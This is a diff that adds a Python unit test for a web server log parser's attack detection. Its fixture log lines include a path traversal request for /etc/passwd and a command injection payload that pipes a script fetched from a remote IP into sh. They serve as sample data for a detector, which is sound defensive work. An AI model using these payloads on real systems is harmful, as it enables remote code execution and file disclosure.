@@ -143,3 +143,21 @@ async def test_execute_from_artifact(tmp_path: Path) -> None:
     assert result.exit_status == 0
     assert result.metrics["lines_matched"] == 6
     assert result.metrics["attacks_detected"] > 0
+
+
+def test_syslog_prefixed_web_log_and_payload_attacks() -> None:
+    syslog_web_sample = (
+        '2026-10-14T22:14:02.114Z prod-api-srv01 nginx[1420]: 185.220.101.44 - - "GET /../etc/passwd HTTP/1.1" 400 157 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine)"\n'
+        '2026-10-14T22:15:31.402Z prod-api-srv01 nginx[1421]: 185.220.101.44 - - "POST /api/v2/diagnostics/ping HTTP/1.1" 200 45 "https://prod-api.internal/" "curl/8.4.0" payload="ip=127.0.0.1;curl -fsSL http://198.51.100.89/dropper.sh | sh"\n'
+    )
+    parser = WebServerLogParser()
+    result = parser.parse_text(syslog_web_sample, WebServerLogParserArgs())
+
+    assert result.metrics["lines_matched"] == 2
+    assert result.metrics["lines_unrecognized"] == 0
+    assert result.metrics["attacks_detected"] >= 2
+    assert "command_injection" in result.metrics["attacks_by_category"]
+    assert "traversal" in result.metrics["attacks_by_category"]
+    assert len(result.evidence) == 2
+    assert result.evidence[0].data["client_ip"] == "185.220.101.44"
+    assert result.evidence[1].data["status_code"] == 200
